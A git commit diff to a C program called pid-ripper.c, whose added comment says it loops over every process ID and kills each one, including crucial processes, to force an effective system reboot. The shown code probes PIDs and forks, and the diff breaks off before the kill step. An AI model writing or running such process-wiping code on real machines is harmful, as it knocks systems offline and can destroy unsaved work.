c85704a03b354ea49621d44a93d95435bbb08dbc
Likhith Reddy Kaliki <did79385@gmail.com>
2026-01-26 23:41:32 +0530

    Update pid-ripper.c

--- pid-ripper.c
+++ pid-ripper.c
@@ -1,3 +1,7 @@
+//This is a pid ripper as the name suggests here i implmenter what i call myself as a pid ripper it seearhces ever pid through a loop and 
+//kill it with a small mechanism hence hitting crucial processes in the way and completey killing all process and effectively doing a system reboot
+//no malicious intent tho just showing the power of syscalls and exploiting the UB of c programming language
+
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/wait.h>
@@ -6,7 +10,7 @@ int main() {
     for (int i = 1; i <= 100000; i++) {
         
         if (kill(i, 0) == 0) { 
-            printf("[Loop] Found valid PID: %d. Dispatching killer...\n", i);
+            printf("Found valid PID: %d. Dispatching killer...\n", i);
 
             pid_t pid = fork();
             if (pid == 0) {
